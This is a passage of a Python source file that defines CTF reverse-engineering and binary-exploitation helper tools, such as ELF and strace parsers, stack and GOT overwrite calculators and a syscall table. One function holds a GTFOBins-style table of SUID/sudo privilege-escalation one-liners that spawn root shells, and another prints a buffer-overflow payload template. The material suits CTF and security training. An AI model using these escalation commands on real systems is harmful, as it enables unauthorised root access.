    """Generate a GDB / pwndbg / GEF debugging script with automatic breakpoints, register dumps, and input piping.

    :param binary_path: Path to the binary executable
    :param breakpoints_csv: Comma-separated breakpoints (e.g. 'main, *0x401230, vuln')
    :param payload_hex: Optional hex payload string to pass as stdin input
    """
    bps = [b.strip() for b in breakpoints_csv.split(",") if b.strip()]

    script = [
        f"# GDB Debugging Script for {binary_path}",
        f"file {binary_path}",
        f"set pagination off",
        f"set disassembly-flavor intel",
        f"",
        f"# Breakpoints",
    ]
    for b in bps:
        script.append(f"b {b}")

    script.append("")
    if payload_hex:
        script.append(f"# Run with hex input payload")
        script.append(f"run <<< $(python3 -c \"import sys; sys.stdout.buffer.write(bytes.fromhex('{payload_hex.strip()}'))\")")
    else:
        script.append(f"# Run")
        script.append(f"run")

    script.append(f"info registers")
    script.append(f"x/16gx $rsp")

    return "\n".join(script)


@tool(category="rev")
def elf_sections_symbols(path: str) -> str:
    """Inspect ELF 32/64-bit binary sections (.text, .rodata, .got, .plt) and symbols.

    :param path: Path to the ELF binary
    """
    import os
    import struct

    if not os.path.exists(path):
        return f"ERROR: File not found: {path}"

    data = open(path, "rb").read()
    if not data.startswith(b"\x7fELF"):
        return f"ERROR: File is not an ELF binary (magic: {data[:4].hex()})"

    is_64 = (data[4] == 2)
    endian = "<" if data[5] == 1 else ">"

    lines = [
        f"ELF Binary Analysis: {path}",
        f"  Class      : {'ELF64' if is_64 else 'ELF32'}",
        f"  Endianness : {'Little-Endian' if data[5] == 1 else 'Big-Endian'}",
    ]

    if is_64 and len(data) >= 64:
        e_type, e_machine, e_version, e_entry, e_phoff, e_shoff, e_flags, e_ehsize, e_phentsize, e_phnum, e_shentsize, e_shnum, e_shstrndx = struct.unpack(
            f"{endian}HHIQQQIHHHHHH", data[16:64]
        )
        lines.append(f"  Entry Point: 0x{e_entry:x}")
        lines.append(f"  Section Hdr: offset 0x{e_shoff:x} ({e_shnum} sections)")

        # Read section string table
        if e_shoff > 0 and e_shnum > 0 and e_shstrndx < e_shnum:
            shstr_hdr_offset = e_shoff + e_shstrndx * e_shentsize
            if shstr_hdr_offset + 64 <= len(data):
                _, _, _, _, sh_offset, sh_size, _, _, _, _ = struct.unpack(f"{endian}IIQQQQIIQQ", data[shstr_hdr_offset:shstr_hdr_offset+64])
                strtab = data[sh_offset:sh_offset+sh_size]

                def get_sh_name(name_offset):
                    end = strtab.find(b"\x00", name_offset)
                    return strtab[name_offset:end].decode("latin-1", errors="ignore") if end != -1 else ""

                lines.append("\n=== ELF Sections ===")
                for s_i in range(min(e_shnum, 30)):
                    s_offset = e_shoff + s_i * e_shentsize
                    if s_offset + 64 <= len(data):
                        sh_name_idx, sh_type, sh_flags, sh_addr, sh_off, s_sz, _, _, _, _ = struct.unpack(f"{endian}IIQQQQIIQQ", data[s_offset:s_offset+64])
                        s_name = get_sh_name(sh_name_idx) or f"section_{s_i}"
                        lines.append(f"  [{s_i:02d}] {s_name:<16} Addr: 0x{sh_addr:08x} | Size: {s_sz} bytes | Offset: 0x{sh_off:x}")

    return "\n".join(lines)


@tool(category="rev")
def linux_strace_parse(strace_path_or_text: str) -> str:
    """Parse Linux strace log output to extract file accesses, secret comparisons, network connections, and spawned processes.

    :param strace_path_or_text: Path to strace log file or raw strace output text
    """
    import os
    import re

    if os.path.exists(strace_path_or_text):
        content = open(strace_path_or_text, "r", errors="ignore").read()
    else:
        content = strace_path_or_text

    lines = content.splitlines()
    files_opened = []
    exec_calls = []
    read_buffers = []
    network_calls = []

    for l in lines:
        l_str = l.strip()
        # 1. Open / openat
        m_open = re.search(r"(?:open|openat)\([^,]+,\s*\"([^\"]+)\"", l_str)
        if m_open:
            files_opened.append(m_open.group(1))
        # 2. Execve
        m_exec = re.search(r"execve\(\"([^\"]+)\",\s*\[([^\]]+)\]", l_str)
        if m_exec:
            exec_calls.append(f"{m_exec.group(1)} with args [{m_exec.group(2)}]")
        # 3. Read buffers containing strings
        m_read = re.search(r"read\(\d+,\s*\"([^\"]+)\",\s*(\d+)\)\s*=\s*(\d+)", l_str)
        if m_read:
            read_buffers.append(f"read {m_read.group(3)} bytes -> `{m_read.group(1)}`")
        # 4. Connect / Socket
        m_conn = re.search(r"connect\(\d+,\s*\{([^\}]+)\}", l_str)
        if m_conn:
            network_calls.append(m_conn.group(1))

    out = [f"=== Linux strace Analysis ({len(lines)} lines parsed) ==="]
    if exec_calls:
        out.append("\nSpawned Processes (execve):")
        for e in dict.fromkeys(exec_calls):
            out.append(f"  → {e}")
    if files_opened:
        out.append("\nFiles Opened (open / openat):")
        for f in dict.fromkeys(files_opened)[:15]:
            out.append(f"  → {f}")
    if read_buffers:
        out.append("\nRead Buffers / Data Streams:")
        for r in read_buffers[:10]:
            out.append(f"  → {r}")
    if network_calls:
        out.append("\nNetwork Connections (connect):")
        for n in dict.fromkeys(network_calls):
            out.append(f"  → {n}")

    return "\n".join(out)


@tool(category="pwn")
def canary_offset_calc(offset_to_canary: int, buffer_size: int = 64, arch: str = "64") -> str:
    """Calculate stack frame layout offsets (buffer, stack canary, saved frame pointer, return address RIP/EIP).

    :param offset_to_canary: Distance in bytes from buffer start to the stack canary
    :param buffer_size: Declared local buffer size in bytes
    :param arch: Architecture ('64' for x86_64, '32' for x86)
    """
    ptr_size = 8 if arch == "64" else 4
    canary_size = ptr_size
    saved_fp_size = ptr_size

    canary_start = offset_to_canary
    canary_end = canary_start + canary_size
    saved_fp_start = canary_end
    saved_fp_end = saved_fp_start + saved_fp_size
    ret_addr_offset = saved_fp_end

    diagram = [
        f"=== Stack Layout Calculation ({arch}-bit Architecture) ===",
        f"  [0x00 - 0x{buffer_size:02x}] Local Buffer ({buffer_size} bytes)",
    ]
    if offset_to_canary > buffer_size:
        diagram.append(f"  [0x{buffer_size:02x} - 0x{canary_start:02x}] Compiler Alignment / Padding ({canary_start - buffer_size} bytes)")
    diagram.extend([
        f"  [0x{canary_start:02x} - 0x{canary_end:02x}] Stack Canary ({canary_size} bytes) 🛡️",
        f"  [0x{saved_fp_start:02x} - 0x{saved_fp_end:02x}] Saved Frame Pointer ({'RBP' if arch == '64' else 'EBP'}, {saved_fp_size} bytes)",
        f"  [0x{ret_addr_offset:02x}+] Return Address Instruction Pointer ({'RIP' if arch == '64' else 'EIP'})\n",
        f"Payload Construction Structure:",
        f"  payload = b'A' * {canary_start} + p{ptr_size*8}(canary) + b'B' * {saved_fp_size} + p{ptr_size*8}(target_rip)"
    ])

    return "\n".join(diagram)


@tool(category="rev")
def linux_caps_audit(capabilities_str: str) -> str:
    """Analyze Linux file capabilities (e.g. getcap output) and explain security & privilege implications.

    :param capabilities_str: Capability string or getcap line (e.g. '/usr/bin/python3 = cap_setuid+ep')
    """
    CAP_DESCRIPTIONS = {
        "cap_setuid": "Allows setting arbitrary process UID (equivalent to full root if abused).",
        "cap_setgid": "Allows setting arbitrary process GID (privilege elevation to root/wheel/shadow).",
        "cap_dac_read_search": "Bypasses file read permission checks and directory search permissions (read /etc/shadow, root flags).",
        "cap_dac_override": "Bypasses all file read, write, and execute permission checks (write to /etc/passwd, /etc/sudoers).",
        "cap_sys_admin": "Vast system administration privileges (mount filesystems, load eBPF, raw memory).",
        "cap_sys_ptrace": "Allows tracing and injecting code into arbitrary processes using ptrace().",
        "cap_net_raw": "Allows sending and receiving raw network packets (promiscuous packet sniffing, forging).",
        "cap_net_bind_service": "Allows binding to privileged ports (< 1024).",
        "cap_chown": "Allows changing file ownership to arbitrary UID/GID.",
        "cap_sys_chroot": "Allows use of chroot() and manipulating namespaces.",
        "cap_sys_module": "Allows loading and unloading arbitrary Linux kernel modules.",
    }

    clean = capabilities_str.strip()
    lines = [f"Linux Capability Analysis for: {clean}\n"]

    found = False
    for cap, desc in CAP_DESCRIPTIONS.items():
        if cap in clean.lower():
            lines.append(f"  • {cap.upper()}:\n      {desc}")
            found = True

    if not found:
        lines.append("  No well-known high-impact capability names matched in string.")

    return "\n".join(lines)


@tool(category="pwn")
def linux_suid_gtfobins_lookup(binary_name: str) -> str:
    """Lookup GTFOBins privilege escalation and file read/write methods for common Linux binaries.

    :param binary_name: Name of the binary (e.g. 'find', 'vim', 'bash', 'awk', 'python', 'base64', 'tar')
    """
    BIN_DATA = {
        "find": {
            "suid": "find . -exec /bin/sh -p \\; -quit",
            "sudo": "sudo find . -exec /bin/sh \\; -quit",
            "file_read": "find /path/to/flag -exec cat {} \\;"
        },
        "vim": {
            "suid": "vim -c ':py3 import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'",
            "sudo": "sudo vim -c ':!/bin/sh'",
            "file_read": "vim /path/to/flag"
        },
        "bash": {
            "suid": "bash -p",
            "sudo": "sudo bash",
            "file_read": "bash -c 'cat < /path/to/flag'"
        },
        "awk": {
            "suid": "awk 'BEGIN {system(\"/bin/sh -p\")}'",
            "sudo": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
            "file_read": "awk '//' /path/to/flag"
        },
        "python": {
            "suid": "python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
            "sudo": "sudo python3 -c 'import os; os.system(\"/bin/sh\")'",
            "file_read": "python3 -c 'print(open(\"/path/to/flag\").read())'"
        },
        "tar": {
            "suid": "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "sudo": "sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
            "file_read": "tar -cf - /path/to/flag | tar -xf - -O"
        },
        "base64": {
            "suid": "base64 /path/to/flag | base64 --decode",
            "sudo": "sudo base64 /path/to/flag | base64 --decode",
            "file_read": "base64 /path/to/flag | base64 -d"
        },
        "cp": {
            "suid": "cp --attributes-only --preserve=all /bin/sh /tmp/sh_suid (or overwrite /etc/passwd)",
            "sudo": "sudo cp /bin/sh /tmp/sh",
            "file_read": "cp /path/to/flag /dev/stdout"
        },
        "less": {
            "suid": "less /etc/profile -> !/bin/sh -p",
            "sudo": "sudo less /etc/profile -> !/bin/sh",
            "file_read": "less /path/to/flag"
        },
        "nmap": {
            "suid": "nmap --interactive -> !sh (old) or nmap --script <script>",
            "sudo": "sudo nmap --interactive",
            "file_read": "nmap -iL /path/to/flag"
        }
    }

    b_clean = binary_name.lower().strip().split("/")[-1]
    if b_clean not in BIN_DATA:
        return (
            f"Binary '{b_clean}' not in local quick table.\n"
            f"Query GTFOBins online at: https://gtfobins.github.io/gtfobins/{b_clean}/"
        )

    info = BIN_DATA[b_clean]
    lines = [
        f"GTFOBins Reference for `{b_clean}`:",
        f"  • SUID Exec     : `{info.get('suid', 'N/A')}`",
        f"  • Sudo Exec     : `{info.get('sudo', 'N/A')}`",
        f"  • File Read PoC : `{info.get('file_read', 'N/A')}`",
    ]
    return "\n".join(lines)


@tool(category="pwn")
def linux_syscall_lookup(query: str, arch: str = "64") -> str:
    """Lookup Linux system call numbers and register conventions for x86_64 and x86 shellcoding / pwn.

    :param query: Syscall name (e.g. 'execve', 'read', 'write', 'mprotect', 'openat') or number
    :param arch: Architecture ('64' or '32')
    """
    SYSCALLS_64 = {
        "read": (0, "int fd, void *buf, size_t count", "rax=0, rdi=fd, rsi=buf, rdx=count"),
        "write": (1, "int fd, const void *buf, size_t count", "rax=1, rdi=fd, rsi=buf, rdx=count"),
        "open": (2, "const char *filename, int flags, umode_t mode", "rax=2, rdi=filename, rsi=flags, rdx=mode"),
        "close": (3, "int fd", "rax=3, rdi=fd"),
        "stat": (4, "const char *filename, struct stat *statbuf", "rax=4, rdi=filename, rsi=statbuf"),
        "fstat": (5, "int fd, struct stat *statbuf", "rax=5, rdi=fd, rsi=statbuf"),
        "lseek": (8, "int fd, off_t offset, int whence", "rax=8, rdi=fd, rsi=offset, rdx=whence"),
        "mmap": (9, "unsigned long addr, unsigned long len, unsigned long prot, unsigned long flags, unsigned long fd, unsigned long pgoff", "rax=9, rdi=addr, rsi=len, rdx=prot, r10=flags, r8=fd, r9=pgoff"),
        "mprotect": (10, "unsigned long start, size_t len, unsigned long prot", "rax=10, rdi=start, rsi=len, rdx=prot"),
        "munmap": (11, "unsigned long addr, size_t len", "rax=11, rdi=addr, rsi=len"),
        "brk": (12, "unsigned long brk", "rax=12, rdi=brk"),
        "rt_sigaction": (13, "int sig, const struct sigaction *act, struct sigaction *oact, size_t sigsetsize", "rax=13, rdi=sig, rsi=act, rdx=oact, r10=sigsetsize"),
        "ioctl": (16, "int fd, unsigned int cmd, unsigned long arg", "rax=16, rdi=fd, rsi=cmd, rdx=arg"),
        "access": (21, "const char *filename, int mode", "rax=21, rdi=filename, rsi=mode"),
        "pipe": (22, "int *filedes", "rax=22, rdi=filedes"),
        "select": (23, "int n, fd_set *inp, fd_set *outp, fd_set *exp, struct timeval *tvp", "rax=23, rdi=n, rsi=inp, rdx=outp, r10=exp, r8=tvp"),
        "dup2": (33, "int oldfd, int newfd", "rax=33, rdi=oldfd, rsi=newfd"),
        "socket": (41, "int family, int type, int protocol", "rax=41, rdi=family, rsi=type, rdx=protocol"),
        "connect": (42, "int fd, struct sockaddr *uservaddr, int addrlen", "rax=42, rdi=fd, rsi=uservaddr, rdx=addrlen"),
        "accept": (43, "int fd, struct sockaddr *upeer_sockaddr, int *upeer_addrlen", "rax=43, rdi=fd, rsi=upeer_sockaddr, rdx=upeer_addrlen"),
        "sendto": (44, "int fd, void *buff, size_t len, unsigned int flags, struct sockaddr *addr, int addr_len", "rax=44, rdi=fd, rsi=buff, rdx=len, r10=flags, r8=addr, r9=addr_len"),
        "recvfrom": (45, "int fd, void *ubuf, size_t size, unsigned int flags, struct sockaddr *addr, int *addr_len", "rax=45, rdi=fd, rsi=ubuf, rdx=size, r10=flags, r8=addr, r9=addr_len"),
        "bind": (49, "int fd, struct sockaddr *umyaddr, int addrlen", "rax=49, rdi=fd, rsi=umyaddr, rdx=addrlen"),
        "listen": (50, "int fd, int backlog", "rax=50, rdi=fd, rsi=backlog"),
        "clone": (56, "unsigned long clone_flags, unsigned long newsp, int *parent_tidptr, int *child_tidptr, unsigned long tls", "rax=56, rdi=clone_flags, rsi=newsp, rdx=parent_tidptr, r10=child_tidptr, r8=tls"),
        "fork": (57, "void", "rax=57"),
        "vfork": (58, "void", "rax=58"),
        "execve": (59, "const char *filename, const char *const *argv, const char *const *envp", "rax=59, rdi=filename, rsi=argv, rdx=envp"),
        "exit": (60, "int error_code", "rax=60, rdi=error_code"),
        "wait4": (61, "pid_t upid, int *stat_addr, int options, struct rusage *ru", "rax=61, rdi=upid, rsi=stat_addr, rdx=options, r10=ru"),
        "kill": (62, "pid_t pid, int sig", "rax=62, rdi=pid, rsi=sig"),
        "uname": (63, "struct old_utsname *name", "rax=63, rdi=name"),
        "gettimeofday": (96, "struct timeval *tv, struct timezone *tz", "rax=96, rdi=tv, rsi=tz"),
        "getuid": (102, "void", "rax=102"),
        "getgid": (104, "void", "rax=104"),
        "setuid": (105, "uid_t uid", "rax=105, rdi=uid"),
        "setgid": (106, "gid_t gid", "rax=106, rdi=gid"),
        "geteuid": (107, "void", "rax=107"),
        "getegid": (108, "void", "rax=108"),
        "prctl": (157, "int option, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5", "rax=157, rdi=option, rsi=arg2, rdx=arg3, r10=arg4, r8=arg5"),
        "openat": (257, "int dfd, const char *filename, int flags, umode_t mode", "rax=257, rdi=dfd, rsi=filename, rdx=flags, r10=mode"),
        "sendfile": (40, "int out_fd, int in_fd, off_t *offset, size_t count", "rax=40, rdi=out_fd, rsi=in_fd, rdx=offset, r10=count"),
        "memfd_create": (319, "const char *uname, unsigned int flags", "rax=319, rdi=uname, rsi=flags"),
        "execveat": (322, "int dfd, const char *filename, const char *const *argv, const char *const *envp, int flags", "rax=322, rdi=dfd, rsi=filename, rdx=argv, r10=envp, r8=flags"),
    }

    clean_q = query.lower().strip()
    matches = []

    if clean_q.isdigit():
        target_num = int(clean_q)
        for name, (num, sig, regs) in SYSCALLS_64.items():
            if num == target_num:
                matches.append((name, num, sig, regs))
    else:
        for name, (num, sig, regs) in SYSCALLS_64.items():
            if clean_q in name:
                matches.append((name, num, sig, regs))

    if not matches:
        return f"No matching syscall found for '{query}'."

    lines = [f"Linux x86_64 Syscall Reference ({len(matches)} match(es)):"]
    for name, num, sig, regs in matches:
        lines.append(
            f"  • sys_{name} (RAX = {num} / 0x{num:02x}):\n"
            f"      Signature : {name}({sig})\n"
            f"      Registers : {regs}"
        )
    lines.append("\nCalling Convention (x86_64):")
    lines.append("  Syscall Instruction : `syscall` (0x0f 0x05)")
    lines.append("  Arguments (in order): RAX (num), RDI (arg1), RSI (arg2), RDX (arg3), R10 (arg4), R8 (arg5), R9 (arg6)")
    lines.append("  Return Value        : RAX (negative on error: -errno)")
    return "\n".join(lines)


@tool(category="rev")
def linux_so_symbols(path: str) -> str:
    """Inspect dynamic dependencies (DT_NEEDED) and exported/imported symbols of an ELF binary or shared object (.so).

    :param path: Path to the binary or .so file
    """
    import os
    import subprocess
    import shutil

    if not os.path.exists(path):
        return f"ERROR: File not found: {path}"

    readelf = shutil.which("readelf")
    objdump = shutil.which("objdump")

    lines = [f"Shared Object / Dynamic Link Analysis for {path}:"]

    # 1. Check ldd / DT_NEEDED
    if readelf:
        res = subprocess.run([readelf, "-d", path], capture_output=True, text=True)
        if res.returncode == 0:
            needed = [l.strip() for l in res.stdout.splitlines() if "NEEDED" in l or "SONAME" in l or "RPATH" in l or "RUNPATH" in l]
            if needed:
                lines.append("\nDynamic Section Headers:")
                for n in needed:
                    lines.append(f"  {n}")

        # 2. Dynamic Symbols
        res_sym = subprocess.run([readelf, "--dyn-syms", path], capture_output=True, text=True)
        if res_sym.returncode == 0:
            sym_lines = [l for l in res_sym.stdout.splitlines() if "FUNC" in l or "OBJECT" in l]
            if sym_lines:
                lines.append(f"\nDynamic Symbols ({len(sym_lines)} symbols):")
                for s in sym_lines[:25]:
                    lines.append(f"  {s}")

    elif objdump:
        res = subprocess.run([objdump, "-T", path], capture_output=True, text=True)
        if res.returncode == 0:
            lines.append("\nDynamic Symbol Table (objdump -T):")
            lines.extend(f"  {l}" for l in res.stdout.splitlines()[:25])
    else:
        return "Neither readelf nor objdump is available on system."

    return "\n".join(lines)


@tool(category="pwn")
def endian_converter(value: str) -> str:
    """Convert a value between Little-Endian, Big-Endian, packed hex (p32/p64), integer, and float representations.

    :param value: Input hex string (e.g. '0x08048000', 'deadbeef') or integer
    """
    import struct
    clean = value.strip().replace(" ", "")

    # Parse integer or hex
    try:
        if clean.startswith("0x") or clean.startswith("0X") or any(c in "abcdefABCDEF" for c in clean):
            num = int(clean.replace("0x", "").replace("0X", ""), 16)
        else:
            num = int(clean)
    except ValueError:
        return f"ERROR: Could not parse '{value}' as integer or hex."

    lines = [f"=== Endianness & Binary Packing for {value} (Integer: {num}) ==="]

    # 32-bit representations
    if 0 <= num <= 0xFFFFFFFF:
        le_32 = struct.pack("<I", num)
        be_32 = struct.pack(">I", num)
        lines.extend([
            f"\n32-Bit Unsigned Integer (DWORD):",
            f"  Little-Endian (p32) : b'{''.join(f'\\\\x{b:02x}' for b in le_32)}' (hex: {le_32.hex()})",
            f"  Big-Endian          : b'{''.join(f'\\\\x{b:02x}' for b in be_32)}' (hex: {be_32.hex()})",
            f"  pwntools syntax     : p32(0x{num:08x})"
        ])

    # 64-bit representations
    if 0 <= num <= 0xFFFFFFFFFFFFFFFF:
        le_64 = struct.pack("<Q", num)
        be_64 = struct.pack(">Q", num)
        lines.extend([
            f"\n64-Bit Unsigned Integer (QWORD):",
            f"  Little-Endian (p64) : b'{''.join(f'\\\\x{b:02x}' for b in le_64)}' (hex: {le_64.hex()})",
            f"  Big-Endian          : b'{''.join(f'\\\\x{b:02x}' for b in be_64)}' (hex: {be_64.hex()})",
            f"  pwntools syntax     : p64(0x{num:016x})"
        ])

    return "\n".join(lines)


@tool(category="pwn")
def got_plt_entry_calc(libc_base: str, target_func_offset: str, got_addr: str = "") -> str:
    """Calculate runtime addresses, libc base offsets, and GOT overwrite delta for binary exploitation.

    :param libc_base: Base address of libc (e.g. '0x7ffff7dc0000')
    :param target_func_offset: Offset of target function (e.g. system offset '0x50d70') or symbol name
    :param got_addr: Optional GOT address of function to overwrite (e.g. puts@got '0x404020')
    """
    def _parse_h(s: str) -> int:
        clean = s.strip().replace("0x", "").replace("0X", "")
        return int(clean, 16)

    try:
        base = _parse_h(libc_base)
        target = _parse_h(target_func_offset)
    except ValueError:
        return "ERROR: libc_base and target_func_offset must be valid hex addresses."

    runtime_addr = base + target
    lines = [
        f"=== GOT / PLT Exploitation Address Calculation ===",
        f"  Libc Base Address : 0x{base:016x}",
        f"  Target Offset     : +0x{target:x}",
        f"  Runtime Target    : 0x{runtime_addr:016x} (e.g. system() runtime address)"
    ]

    if got_addr:
        try:
            got = _parse_h(got_addr)
            lines.extend([
                f"\nGOT Overwrite Target:",
                f"  GOT Entry Address : 0x{got:016x}",
                f"  Pwntools payload  : {got} -> {runtime_addr}",
                f"  write64 / fmtstr  : overwrite 0x{got:x} with 0x{runtime_addr:x}"
            ])
        except ValueError:
            pass

    return "\n".join(lines)
